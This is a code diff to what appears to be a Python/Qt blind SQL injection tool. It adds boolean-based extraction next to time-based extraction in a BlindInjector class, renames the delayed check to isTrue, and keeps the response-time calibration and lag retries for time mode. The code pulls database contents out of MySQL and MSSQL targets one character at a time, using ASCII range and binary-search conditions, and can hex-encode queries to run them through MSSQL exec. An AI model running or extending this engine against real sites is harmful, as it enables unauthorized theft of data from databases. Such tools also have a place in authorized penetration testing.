@@ -388,11 +388,15 @@ class BlindInjector(QtCore.QThread):
     #Current db type selected
     def blindType(self, todo):
         if self.vars['db_type'] == "MySQL":
-            if self.vars['blind_inj_type'] == "TIME-BASED":
+            if self.vars['blind_inj_type'] == "Time":
                 qstring = self.qstrings['mysql_blind_time_based'][todo]
+            else:
+                qstring = self.qstrings['mysql_blind_boolean_based'][todo]
         else:
-            if self.vars['blind_inj_type'] == "TIME-BASED":
+            if self.vars['blind_inj_type'] == "Time":
                 qstring = self.qstrings['mssql_blind_time_based'][todo]
+            else:
+                qstring = self.qstrings['mssql_blind_boolean_based'][todo]
         return core.txtproc.correctQstr(qstring)
     
     def verbose(self, query, respInfo=None):
@@ -447,45 +451,45 @@ class BlindInjector(QtCore.QThread):
             
         start_time = time.time()
         
-        #just resolving
-        response = self.wq.httpRequest("", False, self.vars, True)
-        
-        #Using user-defined 'True' response time
-        if not self.vars['auto_detect']:
-            self.logSignal.emit("\n====================================\n\n"\
-            "[!] Autodetect skipped, using user-defined 'True' response time: " + str(core.txtproc.roundTime(self.vars['true_time'])) +\
-            "sec (rounding from " + str(self.vars['true_time']) + "; Max allowable lag time: " + str(self.vars['max_lag']) +\
-            ")\n\n====================================\n") 
-            self.response = self.vars['true_time']
-        #Auto detecting time
-        else:
-            query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
-            if self.vars['hexed']:
-                hex = core.txtproc.strToHex(query, True)
-                query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
-            for i in range(2):
-                self.verbose(query)
-                response = self.wq.httpRequest(query, False, self.vars, True)
-                self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
-            self.logSignal.emit("\n====================================\n\n"\
-            "[+] Setting 'True' response time to " + str(core.txtproc.roundTime(response)) +\
-            "sec (rounding from " + str(response) + "; Max allowed lag time: " + str(self.vars['max_lag']) +\
-            ")\n\n====================================\n") 
-            #If HTTP timeout occured
-            try:
-                if "Time" in response:
-                    return
-            except TypeError:
-                pass
-            self.response = response
-            self.trueTimeSignal.emit(self.response)
+        if self.vars['blind_inj_type'] == "Time":
+            #just resolving
+            response = self.wq.httpRequest("", False, self.vars, True)
+            #Using user-defined 'True' response time
+            if not self.vars['auto_detect']:
+                self.logSignal.emit("\n====================================\n\n"\
+                "[!] Autodetect skipped, using user-defined 'True' response time: " + str(core.txtproc.roundTime(self.vars['true_time'])) +\
+                "sec (rounding from " + str(self.vars['true_time']) + "; Max allowable lag time: " + str(self.vars['max_lag']) +\
+                ")\n\n====================================\n") 
+                self.response = self.vars['true_time']
+            #Auto detecting time
+            else:
+                query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
+                if self.vars['hexed']:
+                    hex = core.txtproc.strToHex(query, True)
+                    query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
+                for i in range(2):
+                    self.verbose(query)
+                    response = self.wq.httpRequest(query, False, self.vars, True)
+                    self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
+                self.logSignal.emit("\n====================================\n\n"\
+                "[+] Setting 'True' response time to " + str(core.txtproc.roundTime(response)) +\
+                "sec (rounding from " + str(response) + "; Max allowed lag time: " + str(self.vars['max_lag']) +\
+                ")\n\n====================================\n") 
+                #If HTTP timeout occured
+                try:
+                    if "Time" in response:
+                        return
+                except TypeError:
+                    pass
+                self.response = response
+                self.trueTimeSignal.emit(self.response)
             
         #Rows count check. If more than 1 row - aborting.
         if "count(*)" not in self.vars['query_cmd'].lower():
             if "from" in self.vars['query_cmd'].lower():
                 self.mode = "count"
                 if self.preCheck():
-                    if self.delayed("between 50 and 57"):
+                    if self.isTrue("between 50 and 57"):
                         self.querySignal.emit("Query returned more than 1 row.", True)
                         return
                 
@@ -498,19 +502,20 @@ class BlindInjector(QtCore.QThread):
                     break
                 symbol_found = self.getSymbol()
                 if not symbol_found:
-                    if not self.bad_response:
-                        retry_counter = 0
-                        break
-                    else:
-                        if retry_counter > 2:
-                            self.logSignal.emit("[!] Retried " + str(retry_counter) + \
-                            " times, but server response time (" + str(self.bad_time) +\
-                            ") more than maximum allowed (" + str(self.response + self.vars['max_lag'])+ ")"\
-                            " Try to increase maximum lag time. Stopping.")
+                    if self.vars['blind_inj_type'] == "Time":
+                        if not self.bad_response:
+                            retry_counter = 0
                             break
-                        retry_counter += 1
-                        self.logSignal.emit("!!! LAG DETECTED (response time: " + str(self.bad_time) + ") !!!: Retry #"+ str(retry_counter))
-                        time.sleep(3)
+                        else:
+                            if retry_counter > 2:
+                                self.logSignal.emit("[!] Retried " + str(retry_counter) + \
+                                " times, but server response time (" + str(self.bad_time) +\
+                                ") more than maximum allowed (" + str(self.response + self.vars['max_lag'])+ ")"\
+                                " Try to increase maximum lag time. Stopping.")
+                                break
+                            retry_counter += 1
+                            self.logSignal.emit("!!! LAG DETECTED (response time: " + str(self.bad_time) + ") !!!: Retry #"+ str(retry_counter))
+                            time.sleep(3)
                 self.querySignal.emit(self.symbol, True)
                 
         seconds = str(time.time() - start_time).split('.')
@@ -519,54 +524,53 @@ class BlindInjector(QtCore.QThread):
     
     def getSymbol(self):
         #Lower alphabet
-        if self.delayed("between 97 and 122"): 
+        if self.isTrue("between 97 and 122"): 
             self.algorythm("lower_letters", self.lowerAlphabet)
             return True
         #Upper alphabet
-        if self.delayed("between 65 and 90"): 
+        if self.isTrue("between 65 and 90"): 
             self.algorythm("upper_letters", self.upperAlphabet)
             return True
         #Numbers
-        if self.delayed("between 48 and 57"): 
+        if self.isTrue("between 48 and 57"): 
             self.algorythm("numbers", self.numbers)
             return True
         #Special symbols #1
-        if self.delayed("between 32 and 47"): 
+        if self.isTrue("between 32 and 47"): 
             self.algorythm("spec_1", self.spec_1)
             return True
         #Special symbols #2
-        if self.delayed("between 58 and 64"): 
+        if self.isTrue("between 58 and 64"): 
             self.algorythm("spec_2", self.spec_2)
             return True
         #Special symbols #3
-        if self.delayed("between 91 and 96"): 
+        if self.isTrue("between 91 and 96"): 
             self.algorythm("spec_3", self.spec_3)
             return True
         #Special symbols #4
-        if self.delayed("between 123 and 126"): 
+        if self.isTrue("between 123 and 126"): 
             self.algorythm("spec_4")
             return True
         #[new line], [tab]
-        if self.delayed("between 9 and 10"): 
+        if self.isTrue("between 9 and 10"): 
             self.algorythm("other")
             return True          
         return False
         
     def preCheck(self):
         #Checking for valid response
-        if not self.delayed("between 9 and 127"):
+        if not self.isTrue("between 9 and 127"):
             self.string_fetched = True
             self.logSignal.emit("[*] Finished.")
             return False
         #If request valid, but server returned NULL
-        if self.delayed("= 127"):
+        if self.isTrue("= 127"):
             self.string_fetched = True
             self.symbol = "NULL"
             return True
         return True
 
-    #If delay occurred
-    def delayed(self, condition):
+    def isTrue(self, condition):
         if self.mode == "single":
             query = self.wq.buildQuery(self.blindType('single_row'), self.vars,\
                                         {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
@@ -581,23 +585,28 @@ class BlindInjector(QtCore.QThread):
         #If HTTP timeout occured
         try:
             if "Time" in response:
-                    return
+                return
         except TypeError:
                 pass
-        if (core.txtproc.roundTime(response) >= core.txtproc.roundTime(self.response)):
-            self.bad_response = False
-            self.verbose(None, {'rdata' : True,  'rtime' : str(response)})
-            #If response > response time + max lagging time
-            if (core.txtproc.roundTime(response) > (self.response + self.vars['max_lag'])):
-                self.verbose(None, {'rdata' : "UNKNOWN (response time was longer). Try to increase maximum lag time.",  'rtime' : str(response)})
-                self.bad_response = True
-                self.bad_time = response
+        #Time based
+        if self.vars['blind_inj_type'] == "Time":
+            if (core.txtproc.roundTime(response) >= core.txtproc.roundTime(self.response)):
+                self.bad_response = False
+                self.verbose(None, {'rdata' : True,  'rtime' : str(response)})
+                #If response > response time + max lagging time
+                if (core.txtproc.roundTime(response) > (self.response + self.vars['max_lag'])):
+                    self.verbose(None, {'rdata' : "UNKNOWN (response time was longer). Try to increase maximum lag time.",  'rtime' : str(response)})
+                    self.bad_response = True
+                    self.bad_time = response
+                    return False
+                return True
+            else:
+                self.verbose(None, {'rdata' : False,  'rtime' : str(response)})
                 return False
-            return True
+        #Boolean based
         else:
-            self.verbose(None, {'rdata' : False,  'rtime' : str(response)})
-            return False
-                
+            return response
+    
     #Return symbol
     def retSymbol(self, code):
         self.symbol += chr(code)
@@ -627,20 +636,20 @@ class BlindInjector(QtCore.QThread):
         for code_group in range(1, count + 1):
             if self.killed:
                 return
-            if self.delayed("in(" + ','.join(str(code) for code in codeList) + ")"):
-                if self.delayed("> " + str(codeList[1])):
-                    if self.delayed("> " + str(codeList[3])):
-                        if self.delayed("> " + str(codeList[4])):
+            if self.isTrue("in(" + ','.join(str(code) for code in codeList) + ")"):
+                if self.isTrue("> " + str(codeList[1])):
+                    if self.isTrue("> " + str(codeList[3])):
+                        if self.isTrue("> " + str(codeList[4])):
                             self.retSymbol(codeList[5])
                         else:
                             self.retSymbol(codeList[4])
                     else:
-                        if self.delayed("> " + str(codeList[2])):
+                        if self.isTrue("> " + str(codeList[2])):
                             self.retSymbol(codeList[3])
                         else:
                             self.retSymbol(codeList[2])
                 else:
-                    if self.delayed("> " + str(codeList[0])):
+                    if self.isTrue("> " + str(codeList[0])):
                         self.retSymbol(codeList[1])
                     else:
                         self.retSymbol(codeList[0])
@@ -649,7 +658,7 @@ class BlindInjector(QtCore.QThread):
             
         if mode == "lower_letters":
             #y, z
-            if self.delayed("> 121"):
+            if self.isTrue("> 121"):
                 self.retSymbol(122)
             else:
                 self.retSymbol(121)
@@ -657,7 +666,7 @@ class BlindInjector(QtCore.QThread):
                 
         elif mode == "upper_letters":
             #Y, Z
-            if self.delayed("> 89"):
+            if self.isTrue("> 89"):
                 self.retSymbol(90)
             else:
                 self.retSymbol(89)
@@ -665,13 +674,13 @@ class BlindInjector(QtCore.QThread):
 
         elif mode == "numbers":
             #6, 7, 8, 9
-            if self.delayed("> 56"):
+            if self.isTrue("> 56"):
                 self.retSymbol(57)
             else:
-                if self.delayed("> 55"):
+                if self.isTrue("> 55"):
                     self.retSymbol(56)
                 else:
-                    if self.delayed("> 54"):
+                    if self.isTrue("> 54"):
                         self.retSymbol(55)
                     else:
                         self.retSymbol(54)
@@ -679,13 +688,13 @@ class BlindInjector(QtCore.QThread):
             
         elif mode == "spec_1":
             #,- . /
-            if self.delayed("> 46"):
+            if self.isTrue("> 46"):
                 self.retSymbol(47)
             else:
-                if self.delayed("> 45"):
+                if self.isTrue("> 45"):
                     self.retSymbol(46)
                 else:
-                    if self.delayed("> 44"):
+                    if self.isTrue("> 44"):
                         self.retSymbol(45)
                     else:
                         self.retSymbol(44)
@@ -698,20 +707,20 @@ class BlindInjector(QtCore.QThread):
 
         elif mode == "spec_4":
             #{ | } ~
-            if self.delayed("> 125"):
+            if self.isTrue("> 125"):
                 self.retSymbol(126)
             else:
-                if self.delayed("> 124"):
+                if self.isTrue("> 124"):
                     self.retSymbol(125)
                 else:
-                    if self.delayed("> 123"):
+                    if self.isTrue("> 123"):
                         self.retSymbol(124)
                     else:
                         self.retSymbol(123)
             return True
             
         else:
-            if self.delayed("> 9"):
+            if self.isTrue("> 9"):
                 self.retSymbol(10)
             else:
                 self.retSymbol(9)
